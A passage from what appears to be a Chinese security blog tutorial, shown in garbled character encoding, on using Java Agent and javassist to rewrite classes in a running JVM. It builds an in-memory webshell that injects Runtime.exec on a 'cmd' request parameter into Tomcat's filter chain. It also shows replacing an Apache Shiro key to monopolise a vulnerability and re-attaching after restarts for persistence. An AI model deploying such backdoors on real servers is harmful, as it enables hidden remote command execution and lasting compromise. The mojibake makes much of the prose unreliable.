‡å·²ç»åŠ è½½çš„ç±»ã€‚ @SuppressWarnings(\"rawtypes\") Class[] getAllLoadedClasses(); ...... } è·å–æ‰€æœ‰å¯ä¿®æ”¹ç±» å…ˆä»‹ç»getAllLoadedClasseså’ŒisModifiableClassesã€‚é¡¾åæ€ä¹‰ï¼š getAllLoadedClassesï¼šè·å–æ‰€æœ‰å·²ç»åŠ è½½çš„ç±»ã€‚ isModifiableClassesï¼šåˆ¤æ–­æŸä¸ªç±»æ˜¯å¦èƒ½è¢«ä¿®æ”¹ã€‚ ä¿®æ”¹åˆšæ‰çš„AgentMain.javaï¼Œå¹¶ç¼–è¯‘ import java.lang.instrument.Instrumentation; public class AgentMain { public static void agentmain(String agentArgs, Instrumentation inst) { Class[] allLoadedClasses = inst.getAllLoadedClasses(); for (Class cls : allLoadedClasses){ System.out.println(cls.getName()); System.out.print(\"isModifiableClass: \"); System.out.println(inst.isModifiableClass(cls)?\"true\":\"false\"); } } } ä¿®æ”¹Attach.java,å¹¶é‡æ–°attachåˆ°jvmä¸­ import com.sun.tools.attach.AgentInitializationException; import com.sun.tools.attach.AgentLoadException; import com.sun.tools.attach.AttachNotSupportedException; import com.sun.tools.attach.VirtualMachine; import java.io.IOException; public class Attach { public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException { // åˆ—å‡ºæ‰€æœ‰çš„jvm System.out.println(VirtualMachine.list()); String pid = \"68588\"; String jarName = \"/Users/d4m1ts/d4m1ts/java/javaagent/out/artifacts/javaagent_jar/javaagent.jar\"; // è¿æ¥åˆ°JVM VirtualMachine virtualMachine = VirtualMachine.attach(pid); // åŠ è½½agentmain virtualMachine.loadAgent(jarName); // æ–­å¼€è¿æ¥ virtualMachine.detach(); System.out.println(\"ends\"); } } è¿è¡Œå å¾—åˆ°äº†ç›®æ ‡JVMä¸Šæ‰€æœ‰å·²ç»åŠ è½½çš„ç±»ï¼Œå¹¶ä¸”çŸ¥é“äº†è¿™äº›ç±»èƒ½å¦è¢«ä¿®æ”¹ ä¿®æ”¹ç±» ä½¿ç”¨addTransformer()å’ŒretransformClasses()å¯ä»¥ç¯¡æ”¹Classçš„å­—èŠ‚ç  é¦–å…ˆå†çœ‹ä¸€ä¸‹è¿™ä¸¤ä¸ªæ–¹æ³•çš„å£°æ˜ï¼š public interface Instrumentation { // å¢åŠ ä¸€ä¸ª Class æ–‡ä»¶çš„è½¬æ¢å™¨ï¼Œè½¬æ¢å™¨ç”¨äºæ”¹å˜ Class äºŒè¿›åˆ¶æµçš„æ•°æ®ï¼Œå‚æ•° canRetransform è®¾ç½®æ˜¯å¦å…è®¸é‡æ–°è½¬æ¢ã€‚åœ¨ç±»åŠ è½½ä¹‹å‰ï¼Œé‡æ–°å®šä¹‰ Class æ–‡ä»¶ï¼ŒClassDefinition è¡¨ç¤ºå¯¹ä¸€ä¸ªç±»æ–°çš„å®šä¹‰ï¼Œå¦‚æœåœ¨ç±»åŠ è½½ä¹‹åï¼Œéœ€è¦ä½¿ç”¨ retransformClasses æ–¹æ³•é‡æ–°å®šä¹‰ã€‚addTransformeræ–¹æ³•é…ç½®ä¹‹åï¼Œåç»­çš„ç±»åŠ è½½éƒ½ä¼šè¢«Transformeræ‹¦æˆªã€‚å¯¹äºå·²ç»åŠ è½½è¿‡çš„ç±»ï¼Œå¯ä»¥æ‰§è¡ŒretransformClassesæ¥é‡æ–°è§¦å‘è¿™ä¸ªTransformerçš„æ‹¦æˆªã€‚ç±»åŠ è½½çš„å­—èŠ‚ç è¢«ä¿®æ”¹åï¼Œé™¤éå†æ¬¡è¢«retransformï¼Œå¦åˆ™ä¸ä¼šæ¢å¤ã€‚ void addTransformer(ClassFileTransformer transformer, boolean canRetransform); // åˆ é™¤ä¸€ä¸ªç±»è½¬æ¢å™¨ boolean removeTransformer(ClassFileTransformer transformer); // åœ¨ç±»åŠ è½½ä¹‹åï¼Œé‡æ–°å®šä¹‰ Classã€‚è¿™ä¸ªå¾ˆé‡è¦ï¼Œè¯¥æ–¹æ³•æ˜¯1.6 ä¹‹ååŠ å…¥çš„ï¼Œäº‹å®ä¸Šï¼Œè¯¥æ–¹æ³•æ˜¯ update äº†ä¸€ä¸ªç±»ã€‚ void retransformClasses(Class... classes) throws UnmodifiableClassException; ...... } åœ¨addTransformer()æ–¹æ³•ä¸­ï¼Œæœ‰ä¸€ä¸ªå‚æ•°ClassFileTransformer transformerã€‚è¿™ä¸ªå‚æ•°å°†å¸®åŠ©æˆ‘ä»¬å®Œæˆå­—èŠ‚ç çš„ä¿®æ”¹å·¥ä½œã€‚ ClassFileTransformer ClassFileTransformerä¹Ÿæ˜¯ä¸€ä¸ªæ¥å£ï¼Œå®ƒæä¾›äº†transformæ–¹æ³•ï¼Œæ­¤æ–¹æ³•çš„å®ç°å¯èƒ½ä¼šè½¬æ¢æä¾›çš„ç±»æ–‡ä»¶å¹¶è¿”å›æ–°çš„æ›¿æ¢ç±»æ–‡ä»¶ã€‚ æ¥å£æ³¨é‡Šç®€å•æ¦‚æ‹¬ä¸€ä¸‹ï¼š ä½¿ç”¨Instrumentation.addTransformer()æ¥åŠ è½½ä¸€ä¸ªè½¬æ¢å™¨ã€‚ è½¬æ¢å™¨çš„è¿”å›ç»“æœï¼ˆtransform()æ–¹æ³•çš„è¿”å›å€¼ï¼‰å°†æˆä¸ºè½¬æ¢åçš„å­—èŠ‚ç ã€‚ å¯¹äºæ²¡æœ‰åŠ è½½çš„ç±»ï¼Œä¼šä½¿ç”¨ClassLoader.defineClass()å®šä¹‰å®ƒï¼›å¯¹äºå·²ç»åŠ è½½çš„ç±»ï¼Œä¼šä½¿ç”¨ClassLoader.redefineClasses()é‡æ–°å®šä¹‰ï¼Œå¹¶é…åˆInstrumentation.retransformClassesè¿›è¡Œè½¬æ¢ã€‚ ç°åœ¨å·²ç»çŸ¥é“äº†æ€æ ·èƒ½ä¿®æ”¹Classçš„å­—èŠ‚ç ï¼Œå…·ä½“çš„åšæ³•è¿˜éœ€è¦ç”¨åˆ°å¦ä¸€ä¸ªç±»åº“javassistæ¥è·å–å­—èŠ‚ç ï¼Œä¸äº†è§£çš„å¯ä»¥ç½‘ä¸Šæ‰¾æ–‡ç« äº†è§£ä¸‹ï¼Œå¯ä»¥ç®€å•ç†è§£ä¸ºï¼šé€šè¿‡è¿™ä¸ªç±»åº“å¯ä»¥ç›´æ¥åˆ›å»ºä¸€ä¸ªclasså­—èŠ‚ç æ–‡ä»¶ javassist å› ä¸ºæˆ‘ä»¬çš„ç›®çš„åªæ˜¯ä¿®æ”¹æŸä¸ªç±»çš„æŸä¸ªæ–¹æ³•ï¼Œæ‰€ä»¥ç€é‡ä»‹ç»ä¸‹CtMethodï¼Œå…¶ä»–éœ€è¦çš„ç®€å•è¿‡ä¸€ä¸‹ ä¾èµ– org.javassist javassist 3.28.0-GA ClassPool è¿™ä¸ªç±»æ˜¯javassistçš„æ ¸å¿ƒç»„ä»¶ä¹‹ä¸€ã€‚ æ¥çœ‹ä¸€ä¸‹å®˜æ–¹å¯¹ä»–çš„ä»‹ç»ï¼š ClassPoolæ˜¯CtClasså¯¹è±¡çš„å®¹å™¨ã€‚CtClasså¯¹è±¡å¿…é¡»ä»è¯¥å¯¹è±¡è·å¾—ã€‚å¦‚æœget()åœ¨æ­¤å¯¹è±¡ä¸Šè°ƒç”¨ï¼Œåˆ™å®ƒå°†æœç´¢è¡¨ç¤ºçš„å„ç§æºClassPath ä»¥æŸ¥æ‰¾ç±»æ–‡ä»¶ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªCtClassè¡¨ç¤ºè¯¥ç±»æ–‡ä»¶çš„å¯¹è±¡ã€‚åˆ›å»ºçš„å¯¹è±¡å°†è¿”å›ç»™è°ƒç”¨è€…ã€‚ ç®€å•æ¥è¯´ï¼Œè¿™å°±æ˜¯ä¸ªå®¹å™¨ï¼Œå­˜æ”¾çš„æ˜¯CtClasså¯¹è±¡ã€‚ è·å¾—æ–¹æ³•ï¼š ClassPool cp = ClassPool.getDefault();ã€‚é€šè¿‡ ClassPool.getDefault() è·å–çš„ ClassPool ä½¿ç”¨ JVM çš„ç±»æœç´¢è·¯å¾„ã€‚å¦‚æœç¨‹åºè¿è¡Œåœ¨ JBoss æˆ–è€… Tomcat ç­‰ Web æœåŠ¡å™¨ä¸Šï¼ŒClassPool å¯èƒ½æ— æ³•æ‰¾åˆ°ç”¨æˆ·çš„ç±»ï¼Œå› ä¸º Web æœåŠ¡å™¨ä½¿ç”¨å¤šä¸ªç±»åŠ è½½å™¨ä½œä¸ºç³»ç»Ÿç±»åŠ è½½å™¨ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒClassPool å¿…é¡»æ·»åŠ é¢å¤–çš„ç±»æœç´¢è·¯å¾„ã€‚ cp.insertClassPath(new ClassClassPath()); CtClass å¯ä»¥æŠŠå®ƒç†è§£æˆåŠ å¼ºç‰ˆçš„Classå¯¹è±¡ï¼Œéœ€è¦ä»ClassPoolä¸­è·å¾—ã€‚ è·å¾—æ–¹æ³•ï¼šCtClass cc = cp.get(ClassName)ã€‚ CtMethod åŒç†ï¼Œå¯ä»¥ç†è§£æˆåŠ å¼ºç‰ˆçš„Methodå¯¹è±¡ã€‚ è·å¾—æ–¹æ³•ï¼šCtMethod m = cc.getDeclaredMethod(MethodName)ã€‚ è¿™ä¸ªç±»æä¾›äº†ä¸€äº›æ–¹æ³•ï¼Œä½¿æˆ‘ä»¬å¯ä»¥ä¾¿æ·çš„ä¿®æ”¹æ–¹æ³•ä½“ï¼š public final class CtMethod extends CtBehavior { // ä¸»è¦çš„å†…å®¹éƒ½åœ¨çˆ¶ç±» CtBehavior ä¸­ } // çˆ¶ç±» CtBehavior public abstract class CtBehavior extends CtMember { // è®¾ç½®æ–¹æ³•ä½“ public void setBody(String src); // æ’å…¥åœ¨æ–¹æ³•ä½“æœ€å‰é¢ public void insertBefore(String src); // æ’å…¥åœ¨æ–¹æ³•ä½“æœ€åé¢ public void insertAfter(String src); // åœ¨æ–¹æ³•ä½“çš„æŸä¸€è¡Œæ’å…¥å†…å®¹ public int insertAt(int lineNum, String src); } ä¼ é€’ç»™æ–¹æ³• insertBefore() ï¼ŒinsertAfter() å’Œ insertAt() çš„ String å¯¹è±¡æ˜¯ç”±Javassist çš„ç¼–è¯‘å™¨ç¼–è¯‘çš„ã€‚ ç”±äºç¼–è¯‘å™¨æ”¯æŒè¯­è¨€æ‰©å±•ï¼Œä»¥ $ å¼€å¤´çš„å‡ ä¸ªæ ‡è¯†ç¬¦æœ‰ç‰¹æ®Šçš„å«ä¹‰ï¼š ç¬¦å· å«ä¹‰ $0, $1, $2, ... $0 = this; $1 = args[1] ..... $args æ–¹æ³•å‚æ•°æ•°ç»„.å®ƒçš„ç±»å‹ä¸º Object[] $$ æ‰€æœ‰å®å‚ã€‚ä¾‹å¦‚, m($$) ç­‰ä»·äº m($1,$2,...) $cflow(...) cflow å˜é‡ $r è¿”å›ç»“æœçš„ç±»å‹ï¼Œç”¨äºå¼ºåˆ¶ç±»å‹è½¬æ¢ $w åŒ…è£…å™¨ç±»å‹ï¼Œç”¨äºå¼ºåˆ¶ç±»å‹è½¬æ¢ $_ è¿”å›å€¼ è¯¦ç»†çš„å†…å®¹å¯ä»¥çœ‹Javassist ä½¿ç”¨æŒ‡å—ï¼ˆäºŒï¼‰ã€‚ ç¤ºä¾‹ ä¸¾ä¾‹è¯´æ˜ä¸€ä¸‹æ˜¯å¦‚ä½•åŠ¨æ€ä¿®æ”¹ç±»å­—èŠ‚ç çš„ å…ˆè¯´2ä¸ªæ³¨æ„ç‚¹ï¼š å¦‚æœåœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­æ‰¾ä¸åˆ°javassiståŒ…ä¸­çš„ç±»ï¼ˆå› ä¸ºç›®æ ‡ç¯å¢ƒä¹Ÿéœ€è¦è¿™ä¸ªç±»åº“ï¼Œä¸ç„¶ä¼šæ‰¾ä¸åˆ°Classï¼‰ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨URLCLassLoader+åå°„çš„æ–¹å¼è°ƒç”¨ éœ€è¦åœ¨agent.jarä¸­çš„MANIFEST.MFä¸­æ·»åŠ Can-Retransform-Classes: trueï¼Œä¸ç„¶ä¼šæŠ›å‡ºå¼‚å¸¸UnmodifiableClassException è¢«åŠ¨æ€ä¿®æ”¹çš„ç±»æºç ï¼Œå…¶ä¸­Helloç±»çš„helloæ–¹æ³•æ˜¯æˆ‘ä»¬è¦åŠ¨æ€ä¿®æ”¹çš„ç›®æ ‡ï¼Œç”¨Scanneræ˜¯ä¸ºäº†ä¿è¯ç¨‹åºä¸åœæ­¢ï¼Œç»™æˆ‘ä»¬ç•™æœ‰æ“ä½œçš„æ—¶é—´ // Main.java import java.util.Scanner; public class Main { public static void main(String[] args) { Hello h1 = new Hello(); h1.hello(); System.out.println(\"ç­‰å¾…è¾“å…¥...\"); new Scanner(System.in).next(); Hello h2 = new Hello(); h2.hello(); } } // Hello.java public class Hello { public void hello(){ System.out.println(\"hello world\"); } } è¿è¡Œå¹¶è·å–pidï¼ˆ69484ï¼‰ attachä»£ç è¿˜æ˜¯å·®ä¸å¤šï¼Œä¸»è¦æ˜¯ç»™agent.jaré™„åŠ è¿›å» import com.sun.tools.attach.AgentInitializationException; import com.sun.tools.attach.AgentLoadException; import com.sun.tools.attach.AttachNotSupportedException; import com.sun.tools.attach.VirtualMachine; import java.io.IOException; public class Attach { public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException { // åˆ—å‡ºæ‰€æœ‰çš„jvm System.out.println(VirtualMachine.list()); String pid = \"69484\"; String jarName = \"/Users/d4m1ts/d4m1ts/java/javaagent/out/artifacts/javaagent_jar/javaagent.jar\"; // è¿æ¥åˆ°JVM VirtualMachine virtualMachine = VirtualMachine.attach(pid); // åŠ è½½agentmain virtualMachine.loadAgent(jarName); // æ–­å¼€è¿æ¥ virtualMachine.detach(); System.out.println(\"ends\"); } } AgentMainï¼ˆä¸»è¦æ˜¯æ·»åŠ Transformerå’Œè§¦å‘Transformerï¼‰ // AgentMain.java import java.lang.instrument.Instrumentation; import java.lang.instrument.UnmodifiableClassException; public class AgentMain { public static void agentmain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException { Class[] allLoadedClasses = inst.getAllLoadedClasses(); for (Class cls : allLoadedClasses){ // å®šä½åˆ°ç±» if (cls.getName() == TransformerDemo.editClassName){ // æ·»åŠ Transformer inst.addTransformer(new TransformerDemo(), true); // è§¦å‘Transformer inst.retransformClasses(cls); } } } } // TransformerDemo.java import javassist.*; import java.io.IOException; import java.lang.instrument.ClassFileTransformer; import java.lang.instrument.IllegalClassFormatException; import java.security.ProtectionDomain; // addTransformer()çš„ç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦ClassFileTransformerè¿™ä¸ªç±»çš„å¯¹è±¡ public class TransformerDemo implements ClassFileTransformer { public static String editClassName = \"Hello\"; public static String editMethod = \"hello\"; @Override public byte[] transform(ClassLoader loader, String className, Class classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException { ClassPool classPool = ClassPool.getDefault(); // æ·»åŠ é¢å¤–çš„ç±»æœç´¢è·¯å¾„ if (classBeingRedefined != null){ ClassClassPath classClassPath = new ClassClassPath(classBeingRedefined); classPool.insertClassPath(classClassPath); } // ä¿®æ”¹æ–¹æ³•hello()ï¼Œè¿”å› byte[] å­—èŠ‚ç  try { CtClass ctClass = classPool.get(editClassName); CtMethod ctMethod = ctClass.getDeclaredMethod(editMethod); String modifySource = \"System.out.println(\\\"TransformerDemo attached\\\");\"; ctMethod.setBody(modifySource); byte[] bytes = ctClass.toBytecode(); ctClass.detach(); return bytes; } catch (NotFoundException e) { e.printStackTrace(); } catch (CannotCompileException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); } return new byte[0]; } } ç»“æœï¼Œå¯ä»¥çœ‹åˆ°ç¬¬äºŒæ¬¡æ‰§è¡Œhello()æ–¹æ³•æ—¶å‘ç°è¯¥æ–¹æ³•è¢«åŠ¨æ€çš„ä¿®æ”¹äº† å†…å­˜é©¬ æ—¢ç„¶ç°åœ¨å·²ç»èƒ½å¤Ÿä¿®æ”¹æ–¹æ³•ä½“äº†ï¼Œé‚£å°±å¯ä»¥å°†æœ¨é©¬æ”¾åˆ°æŸä¸ªä¸€å®šä¼šæ‰§è¡Œçš„æ–¹æ³•å†…ï¼Œè¿™æ ·çš„è¯ï¼Œå½“è®¿é—®ä»»æ„è·¯ç”±çš„æ—¶å€™ï¼Œå°±ä¼šè°ƒç”¨æœ¨é©¬ã€‚é‚£ä¹ˆç°åœ¨çš„é—®é¢˜å°±å˜æˆäº†ï¼Œæ³¨å…¥åˆ°å“ªä¸€ä¸ªç±»çš„å“ªä¸ªæ–¹æ³•æ¯”è¾ƒå¥½ã€‚ ä¼—æ‰€å‘¨çŸ¥ï¼ŒSpring boot ä¸­å†…åµŒäº†ä¸€ä¸ªembed Tomcatä½œä¸ºå®¹å™¨ï¼Œè€Œåœ¨ç½‘ä¸Šæµä¼ ç€å¾ˆå¤šç‰ˆæœ¬çš„ Tomcatâ€œæ— æ–‡ä»¶â€å†…å­˜é©¬ã€‚è¿™äº›å†…å­˜é©¬å¤§å¤šæ•°éƒ½æ˜¯é€šè¿‡é‡å†™/æ·»åŠ Filteræ¥å®ç°çš„ã€‚æ—¢ç„¶Spring boot ä½¿ç”¨äº†Tomcatï¼Œé‚£ä¹ˆèƒ½ä¸èƒ½ç…§è‘«èŠ¦ç”»ç“¢ï¼Œé€šè¿‡Filterï¼Œå®ç°ä¸€ä¸ªSpring bootçš„å†…å­˜é©¬å‘¢ï¼Ÿå½“ç„¶æ˜¯å¯ä»¥çš„ã€‚ Spring Bootçš„Filter ç»™å†™çš„Controllerä¸‹ä¸ªæ–­ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°æ‰§è¡Œåˆ°controllerçš„æ—¶å€™ï¼Œä¼šç»è¿‡å¾ˆå¤šçš„doFilterå’ŒinternalDoFilteræ–¹æ³•ï¼Œå®ƒä»¬å¤§å¤šæ¥è‡ªäºApplicationFilterChainè¿™ä¸ªç±»ã€‚ çœ‹çœ‹ApplicationFilterChainçš„doFilteræ–¹æ³•ï¼š @Override public void doFilter(ServletRequest request, ServletResponse response) throws IOException, ServletException { if( Globals.IS_SECURITY_ENABLED ) { final ServletRequest req = request; final ServletResponse res = response; try { java.security.AccessController.doPrivileged( new java.security.PrivilegedExceptionAction() { @Override public Void run() throws ServletException, IOException { internalDoFilter(req,res); return null; } } ); } catch (PrivilegedActionException pe) { ...... } } else { internalDoFilter(request,response); } } ä¹ä¸€çœ‹å†…å®¹æŒºå¤šï¼Œå…¶å®æ€»ç»“ä¸‹æ¥å°±æ˜¯è°ƒç”¨this.internalDoFilter()ã€‚æ‰€ä»¥å†æ¥ç®€å•çœ‹ä¸€ä¸‹internalDoFilter()æ–¹æ³•ï¼š private void internalDoFilter(ServletRequest request, ServletResponse response) throws IOException, ServletException { // Call the next filter if there is one if (pos è¿™ä¸¤ä¸ªä¸ªæ–¹æ³•æ‹¥æœ‰Requestå’ŒResponseå‚æ•°ã€‚å¦‚æœèƒ½é‡å†™å…¶ä¸­ä¸€ä¸ªï¼Œé‚£å°±èƒ½æ§åˆ¶æ‰€æœ‰çš„è¯·æ±‚å’Œå“åº”ï¼å› æ­¤ï¼Œç”¨æ¥ä½œä¸ºå†…å­˜é©¬çš„å…¥å£ç‚¹ç®€ç›´å®Œç¾ã€‚è¿™é‡Œæˆ‘é€‰æ‹©doFilter()æ–¹æ³•ï¼Œå…·ä½“åŸå› ä¼šåœ¨ä¹‹åæåˆ°ã€‚ Java agentä¿®æ”¹doFilter æ³¨æ„: æ¯æ¬¡attachä¹‹å‰ï¼Œéœ€è¦è®¿é—®ä¸€ä¸‹springçš„webé¡µé¢ï¼Œè¦è®©Spring Initializing Spring DispatcherServlet 'dispatcherServlet'ï¼ŒåŠ è½½ä¸€ä¸‹éœ€è¦çš„ç±»ï¼Œä¸ç„¶ä¸ä¼šattachæˆåŠŸï¼Œå› ä¸ºæ‰¾ä¸åˆ°æˆ‘ä»¬è¦ä¿®æ”¹çš„ç±»ï¼Œæ‰€ä»¥ä¹Ÿæ‰¾ä¸åˆ°æ–¹æ³•ï¼Œä¹Ÿå°±æ— æ³•ä¿®æ”¹æˆåŠŸ shellä¸­æ‰€æœ‰ç±»éƒ½è¦ç”¨å…¨ç§°ï¼Œæ¯”å¦‚java.io.InputStreamï¼Œä¸ç„¶å¯èƒ½ä¼šæŠ›å‡ºå¼‚å¸¸ å¦‚æœæ˜¯å®Œå…¨æ›¿ä»£æ–¹æ³•ï¼Œè®°å¾—ç”¨{}åŒ…è£¹ å¯èƒ½ä¼šå‡ºç°å„ç§java.lang.NoClassDefFoundErrorçš„é—®é¢˜ï¼Œè·Ÿä¸€ä¸‹è¿™ä¸ªæ–­ç‚¹ï¼Œå°±ä¼šå‘ç°ç¼ºå°‘å„ç§å„æ ·çš„classæ–‡ä»¶ï¼Œè·Ÿäº†ä¸€ä¸‹ï¼Œå‘ç°å¯èƒ½æ˜¯åŠ¨æ€ä¿®æ”¹å­—èŠ‚ç åï¼Œæ•´ä¸ªç±»çš„classéƒ½ä¼šå‡ºç°å¼‚å¸¸ï¼Œå¤ªç¦»è°±äº†ï¼Œä¹Ÿä¸çŸ¥é“ç½‘ä¸Šçš„å¤§å“¥ä»¬ä¸ºå•¥æ²¡é‡åˆ° æ¥ä¸Šä¸€ä¸ªé—®é¢˜ï¼ŒåŠ¨æ€ä¿®æ”¹è¿‡çš„classæ–‡ä»¶åç¼–è¯‘åä»£ç æ˜¯æ²¡é—®é¢˜çš„ï¼Œä½†æ˜¯è¿˜æ˜¯ä¸çŸ¥é“ä¸ºå•¥è§£å†³ä¸äº†æ‰¾ä¸åˆ°ç±»å®šä¹‰çš„é—®é¢˜ å¯¹åˆšæ‰çš„agentä»£ç ç¨å¾®ä¿®æ”¹å³å¯ï¼ˆå®åœ¨é‡å†™ä¸äº†doFilteræ–¹æ³•äº†ï¼Œåˆ†æäº†å‡ å¤©ï¼Œé‡å†™äº†classå°±ç®—ä»£ç æ²¡é—®é¢˜ï¼Œä¹Ÿä¼šå‡ºç°java.lang.NoClassDefFoundErrorçš„é—®é¢˜ï¼‰ å¹¶ä¸”è¿™é‡Œä¸ºäº†ä¸ç ´ååŸæ¥çš„æ–¹æ³•ç»“æ„ï¼Œæˆ‘ä»¬ä¸ç”¨CtMethodçš„setSourceï¼Œè€Œæ˜¯ç”¨insertBeforeæ–¹æ³• AgentMain.java // AgentMain.java import java.lang.instrument.Instrumentation; import java.lang.instrument.UnmodifiableClassException; public class AgentMain { public static void agentmain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException { Class[] allLoadedClasses = inst.getAllLoadedClasses(); for (Class cls : allLoadedClasses){ // å®šä½åˆ°ç±» if (cls.getName() == TransformerDemo.editClassName){ // æ·»åŠ Transformer inst.addTransformer(new TransformerDemo(), true); // è§¦å‘Transformer inst.retransformClasses(cls); } } } } // TransformerDemo.java import javassist.*; import java.io.IOException; import java.lang.instrument.ClassFileTransformer; import java.lang.instrument.IllegalClassFormatException; import java.security.ProtectionDomain; // addTransformer()çš„ç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦ClassFileTransformerè¿™ä¸ªç±»çš„å¯¹è±¡ public class TransformerDemo implements ClassFileTransformer { public static String editClassName = \"org.apache.catalina.core.ApplicationFilterChain\"; public static String editMethod = \"doFilter\"; public static String memshell = \"\" + \" javax.servlet.http.HttpServletRequest req = $1;\\n\" + \" javax.servlet.http.HttpServletResponse res = $2;\\n\" + \" java.lang.String cmd = req.getParameter(\\\"cmd\\\");\\n\" + \"\\n\" + \" if (cmd != null){\\n\" + \" System.out.println(cmd);\" + \" try {\\n\" + \" java.lang.Runtime.getRuntime().exec(cmd);\\n\" + \" } catch (Exception e){\\n\" + \" e.printStackTrace();\\n\" + \" }\\n\" + \" }\\n\" + \" else{\\n\" + \" internalDoFilter(req,res);\\n\" + \" }\\n\" + \"\"; @Override public byte[] transform(ClassLoader loader, String className, Class classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException { ClassPool classPool = ClassPool.getDefault(); // æ·»åŠ é¢å¤–çš„ç±»æœç´¢è·¯å¾„ if (classBeingRedefined != null) { ClassClassPath classClassPath = new ClassClassPath(classBeingRedefined); classPool.insertClassPath(classClassPath); } // ä¿®æ”¹æ–¹æ³•doFilter()ï¼Œè¿”å› byte[] å­—èŠ‚ç  try { CtClass ctClass = classPool.get(editClassName); CtMethod ctMethod = ctClass.getDeclaredMethod(editMethod); ctMethod.insertBefore(memshell); ctClass.writeFile(\"/Users/d4m1ts/d4m1ts/java/Temp/out/artifacts/temp_jar\"); System.out.println(memshell); System.out.println(\"injection success\"); byte[] bytes = ctClass.toBytecode(); ctClass.detach(); return bytes; } catch (NotFoundException e) { e.printStackTrace(); } catch (CannotCompileException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); } return new byte[0]; } } ç»™ä¸Šé¢çš„æ‰“åŒ…æˆagent.jarï¼Œç„¶åé€šè¿‡è™šæ‹Ÿæœºattachåˆ°spring jvmä¸­ï¼Œå†æ‰§è¡Œå‘½ä»¤å³å¯ï¼ˆç†è®ºä¸Šæ˜¯å¯ä»¥çš„ï¼Œç½‘ä¸Šçš„æ–‡ç« ä¹Ÿéƒ½å¯ä»¥æˆåŠŸï¼Œä½†æˆ‘å®åœ¨æ˜¯è°ƒä¸å‡ºæ¥ä¸ºå•¥äº†ï¼‰ æ‹“å±•æ“ä½œ é€šè¿‡åŠ è½½agentå¯ä»¥ä¿®æ”¹å¾ˆå¤šç±»çš„å­—èŠ‚ç ï¼Œæ‰€ä»¥åˆ©ç”¨èµ·æ¥æ“ä½œçš„ç©ºé—´ä¹Ÿå¾ˆå¤§ï¼Œä¸ä»…ä»…æ˜¯å†…å­˜é©¬è¿™ä¸€ä¸ªç‚¹ã€‚ ä¸€ä¸ªæ¯”è¾ƒå¤šçš„åˆ©ç”¨æ–¹æ³•ï¼Œå°±æ˜¯ä¿®æ”¹shiroçš„keyï¼Œè¿™æ ·å¯ä»¥è®©è¿™ä¸ªæ¼æ´ä»…è‡ªå·±å¯ç”¨ï¼Œé¿å…å…±äº«ç›®æ ‡æƒé™ é‡ç‚¹ï¼š åœ¨è§£ærememberMeçš„æ—¶å€™ï¼Œå…ˆå°†å…¶base64è§£ç ï¼Œç„¶åä½¿ç”¨AESè§£å¯†ï¼Œåœ¨AESè§£å¯†çš„æ—¶å€™ï¼Œä¼šè°ƒç”¨org.apache.shiro.mgt.AbstractRememberMeManager#getDecryptionCipherKey()ï¼Œæ›´æ”¹æ‰è¿™ä¸ªå‡½æ•°çš„è¿”å›å€¼ï¼Œå°±å¯ä»¥æ›´æ”¹è§£å¯†çš„å¯†é’¥ã€‚ // ä½¿ç”¨insertBefore() $0.setCipherKey(org.apache.shiro.codec.Base64.decode(\"4AvVhmFLUs0KTA3Kprsdag==\")); // ä½¿ç”¨setBody() return (org.apache.shiro.codec.Base64.decode(\"4AvVhmFLUs0KTA3Kprsdag==\")); æŸ¥æ€ agent å†…å­˜é©¬ç›¸æ¯” filter å†…å­˜é©¬ï¼Œä¼šå¤šä¸€æ­¥å°±æ˜¯æˆ‘ä»¬éœ€è¦å°†æˆ‘ä»¬è‡ªå·±çš„ agent.jar ä¼ åˆ°ç›®æ ‡ä¸Šï¼Œç„¶ååˆ©ç”¨ä»£ç å°† agent.jar è¿›è¡Œæ³¨å…¥ï¼Œæ³¨å…¥ä¹‹åæˆ‘ä»¬å°±å¯ä»¥å°† agent.jar è¿›è¡Œåˆ é™¤ï¼Œagent å†…å­˜é©¬ç›¸æ¯” filter è¿™äº›å†…å­˜é©¬ç›¸å¯¹æ›´éš¾æŸ¥æ€ä¸€äº› åŸºäºjavaAgentå†…å­˜é©¬æ£€æµ‹æŸ¥æ€æŒ‡å— é£é™© æ³¨å…¥agentå†…å­˜é©¬åï¼Œå¯èƒ½å­˜åœ¨æˆ‘ä¸Šé¢é‚£ç§æ•´ä¸ªç½‘ç«™å´©æºƒçš„æƒ…å†µï¼›ç½‘ä¸Šæœ‰è¯´å¯èƒ½æ˜¯å› ä¸ºè™šæ‹Ÿå†…å­˜ä¸å¤Ÿäº†è€Œå¯¼è‡´çš„ï¼Œä½†æ˜¯æˆ‘è®¾ç½®å¤§äº†è™šæ‹Ÿå†…å­˜è¿˜æ˜¯ä¸è¡Œã€‚ã€‚ã€‚ æ‰€ä»¥å®æˆ˜ä¸­å°½é‡è¿˜æ˜¯ç”¨APIå‹çš„å†…å­˜é©¬ å†…å­˜é©¬å¤æ´» æ¢ä¸ªè¯´æ³•ï¼Œå¦‚ä½•é˜²æ­¢å†…å­˜é©¬é‡å¯åå¤±æ•ˆï¼› å…¶å®ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯åœ¨jvmå…³é—­å‰ï¼ŒæŠŠattach.jarå’ŒagentMain.jaréƒ½å†™åˆ°ç£ç›˜ä¸Šï¼Œç„¶åæ— é™è°ƒç”¨attach.jarå°è¯•attachåˆ°jvmä¸­ï¼› ä½†æ˜¯è¿™æ ·æ„Ÿè§‰æ›´å®¹æ˜“è¢«å‘ç°äº†ï¼Œæ‰€è°“æœ‰å¾—å¿…æœ‰å¤±å§emmm æ€»è§ˆ Java Agent ä»å…¥é—¨åˆ°å†…å­˜é©¬ æµ…è°ˆ Java Agent å†…å­˜é©¬ Java 